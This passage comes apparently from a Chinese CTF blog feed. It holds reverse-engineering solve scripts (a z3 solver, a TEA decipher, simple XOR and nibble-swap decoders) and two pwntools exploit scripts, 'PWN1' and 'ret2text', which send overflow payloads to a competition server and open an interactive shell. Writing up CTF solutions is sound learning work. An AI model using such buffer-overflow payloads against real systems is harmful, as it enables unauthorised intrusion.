class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            v7[i][j] = v7[i][j] + flag[<span class="number">5</span>*i+k] * matrix[<span class="number">5</span>*k+j]</span><br><span class="line">            v7[i][j] = v7[i][j] &amp; <span class="number">0x1F</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对角线等于1        </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    solver.add(v7[i][i] == <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 非对角线等于0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> i != j:</span><br><span class="line">            solver.add(v7[i][j] == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 特定字节等于要求值        </span></span><br><span class="line">solver.add(flag[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>))</span><br><span class="line">solver.add(flag[<span class="number">7</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;y&#x27;</span>)) </span><br><span class="line">solver.add(flag[<span class="number">17</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;y&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        res.append(m[flag[i]].as_long())</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(res).decode())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="mySelf"><a href="#mySelf" class="headerlink" title="mySelf"></a>mySelf</h2><p>对比着他的算法，抄过来就可以了，一开始是个SMC，我们需要绕过一下，然后恢复函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">1640531527</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        sum -= <span class="number">1640531527</span>;</span><br><span class="line">        v1 += ((v0 &gt;&gt; <span class="number">5</span>) + <span class="number">2</span>) ^ ((<span class="number">16</span> * v0) + <span class="number">2</span>) ^ (sum + v0);</span><br><span class="line">        v0 += ((v1 &gt;&gt; <span class="number">5</span>) + <span class="number">4</span>) ^ ((<span class="number">16</span> * v1) + <span class="number">3</span>) ^ (sum + v1);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">1640531527</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i, sum = -(<span class="number">1640531527</span> * <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        </span><br><span class="line">        v1 -= ((v0 &gt;&gt; <span class="number">5</span>) + <span class="number">4</span>) ^ ((<span class="number">16</span> * v0) + <span class="number">3</span>) ^ (sum + v0);</span><br><span class="line">        v0 -= ((v1 &gt;&gt; <span class="number">5</span>) + <span class="number">2</span>) ^ ((<span class="number">16</span> * v1) + <span class="number">2</span>) ^ (sum + v1);</span><br><span class="line">        sum += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">8</span>] = &#123; <span class="number">0xBDBDF9F0</span>, <span class="number">0xE26194C4</span>, <span class="number">0x80799125</span>, <span class="number">0x1F0FC219</span>, <span class="number">0xEB6A1815</span>, <span class="number">0x84F572C5</span>, <span class="number">0x40CC3A85</span>, <span class="number">0xD2A32ABB</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> flag[<span class="number">2</span>] = &#123; <span class="number">0x0</span>,<span class="number">0x0</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> pqw[<span class="number">2</span>] = &#123; <span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;Y&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>] = &#123; <span class="number">0x00000020</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000027</span>, <span class="number">0x0000002C</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i, r = <span class="number">32</span>;<span class="comment">//num_rounds建议取值为32</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="comment">//printf(&quot;加密前原始数据：%u %u\n&quot;, v[0],v[1]);</span></span><br><span class="line">    <span class="comment">//encipher(r, v, k);</span></span><br><span class="line">    <span class="comment">//printf(&quot;加密后的数据：%u %u\n&quot;, v[0], v[1]);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[<span class="number">0</span>] = v[i];</span><br><span class="line">        flag[<span class="number">1</span>] = v[i + <span class="number">1</span>];</span><br><span class="line">       <span class="comment">// encipher(r, flag);</span></span><br><span class="line">        decipher(r, flag);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="number">2157182970</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;PWN1&quot;&gt;&lt;a href=&quot;#PWN1&quot; class=&quot;headerlink&quot; title=&quot;PWN1&quot;&gt;&lt;/a&gt;PWN1&lt;/h4&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# p = process(&amp;#x27;./ezshellcode&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p = remote(&lt;span class=&quot;string&quot;&gt;&amp;#x27;pwn.node.game.sycsec.com&amp;#x27;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;30213&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;context(arch=&lt;span class=&quot;string&quot;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;, os=&lt;span class=&quot;string&quot;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;context.log_level = &lt;span class=&quot;string&quot;&gt;&amp;#x27;DEBUG&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;b&amp;#x27;my heart&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;string&quot;&gt;b&amp;#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaSyclover&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;b&amp;#x27;challege!&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a=p.recvline().decode(&lt;span class=&quot;string&quot;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a = a[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:-&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;6666666666&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r = &lt;span class=&quot;built_in&quot;&gt;eval&lt;/span&gt;(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;built_in&quot;&gt;str&lt;/span&gt;(r))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;ret2text&quot;&gt;&lt;a href=&quot;#ret2text&quot; class=&quot;headerlink&quot; title=&quot;ret2text&quot;&gt;&lt;/a&gt;ret2text&lt;/h2&gt;&lt;p&gt;PIE手动爆破,填充数据不是0x50&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;context.log_level = &lt;span class=&quot;string&quot;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# context.terminal = [&amp;#x27;gnome-terminal&amp;#x27;, &amp;#x27;-x&amp;#x27;, &amp;#x27;sh&amp;#x27;, &amp;#x27;-c&amp;#x27;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# r = gdb.debug(&amp;#x27;./ret2text&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# r = process(&amp;#x27;./ret2text&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r = remote(&lt;span class=&quot;string&quot;&gt;&amp;#x27;pwn.node.game.sycsec.com&amp;#x27;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;31949&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;debug&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    gdb.attach(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;elf = ELF(&lt;span class=&quot;string&quot;&gt;&amp;#x27;ret2text&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;se      = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; data               :r.send(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sa      = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; delim,data         :r.sendafter(delim, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sl      = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; data               :r.sendline(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sla     = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; delim,data         :r.sendlineafter(delim, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sea     = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; delim,data         :r.sendafter(delim, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rc      = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; numb=&lt;span class=&quot;number&quot;&gt;4096&lt;/span&gt;          :r.recv(numb)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rl      = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt;                    :r.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ru      = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; delims             :r.recvuntil(delims)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;uu32    = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; data               :u32(data.ljust(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;b&amp;#x27;&#92;0&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;uu64    = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; data               :u64(data.ljust(&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;b&amp;#x27;&#92;0&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;lic 	= &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; data               :uu64(ru(data)[-&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;:])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;padding = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; lenth              :&lt;span class=&quot;string&quot;&gt;b&amp;#x27;Yhuan&amp;#x27;&lt;/span&gt;*(lenth//&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;)+&lt;span class=&quot;string&quot;&gt;b&amp;#x27;Y&amp;#x27;&lt;/span&gt;*(lenth % &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;it      = &lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt;                    :r.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pad = p64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)*&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt; + p64(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;backdoor = &lt;span class=&quot;string&quot;&gt;b&amp;#x27;&#92;x27&#92;xA2&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pl1 = pad + p64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) + backdoor&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;se(pl1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>SHCTF</title>
    <link href="https://wuming.github.io/2023/10/02/SHCTF/"/>
    <id>https://wuming.github.io/2023/10/02/SHCTF/</id>
    <published>2023-10-02T10:19:44.000Z</published>
    <updated>2023-12-18T05:33:29.883Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="WEEK1-ez-asm"><a href="#WEEK1-ez-asm" class="headerlink" title="[WEEK1]ez_asm"></a>[WEEK1]ez_asm</h3><p>简单的asm代码，直接对照的逻辑逆向即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;nhuo[M`7mc7uhc$7midgbTf`7`$7%#ubf7 ci5Y&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">  </span><br><span class="line">  c = flag[i] </span><br><span class="line">  c = <span class="built_in">ord</span>(c)+<span class="number">0xA</span></span><br><span class="line">  flag = flag[:i] + <span class="built_in">chr</span>(c) + flag[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">  c = flag[i]</span><br><span class="line">  c = <span class="built_in">ord</span>(c)^<span class="number">0x1E</span></span><br><span class="line">  flag = flag[:i] + <span class="built_in">chr</span>(c) + flag[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><span id="more"></span> <h3 id="WEEK1-easy-re"><a href="#WEEK1-easy-re" class="headerlink" title="[WEEK1]easy_re"></a>[WEEK1]easy_re</h3><p>他的加密算法就是把字符串的高位变到低位，地位变到高位而已，直接写代码进行替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">des =[</span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0xC6</span>, <span class="number">0x16</span>, <span class="number">0x76</span>, <span class="number">0xB7</span>, <span class="number">0x45</span>, <span class="number">0x27</span>, <span class="number">0x97</span>, <span class="number">0xF5</span>, <span class="number">0x47</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xF5</span>, <span class="number">0x37</span>, <span class="number">0x03</span>, <span class="number">0xC6</span>, <span class="number">0x67</span>, <span class="number">0x33</span>, <span class="number">0xF5</span>, <span class="number">0x47</span>, <span class="number">0x86</span>, </span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0xF5</span>, <span class="number">0x26</span>, <span class="number">0x96</span>, <span class="number">0xE6</span>, <span class="number">0x16</span>, <span class="number">0x27</span>, <span class="number">0x97</span>, <span class="number">0xF5</span>, <span class="number">0x07</span>, </span><br><span class="line">  <span class="number">0x27</span>, <span class="number">0x03</span>, <span class="number">0x26</span>, <span class="number">0xC6</span>, <span class="number">0x33</span>, <span class="number">0xD6</span>, <span class="number">0xD7</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> des:</span><br><span class="line">  high = (<span class="built_in">ord</span>(<span class="built_in">chr</span>(c)) &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span></span><br><span class="line">  low = (<span class="built_in">ord</span>(<span class="built_in">chr</span>(c)) &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span></span><br><span class="line">  orig = high | low</span><br><span class="line">  </span><br><span class="line">  result += <span class="built_in">chr</span>(orig)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h3 id="WEEK1-seed"><a href="#WEEK1-seed" class="headerlink" title="[WEEK1]seed"></a>[WEEK1]seed</h3><p>IDA分析得知就是简单的通过伪随机数获取10个数，然后和flag进行异或，难点在于伪随机数为多少，我们动调后发现他的伪随机数是0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 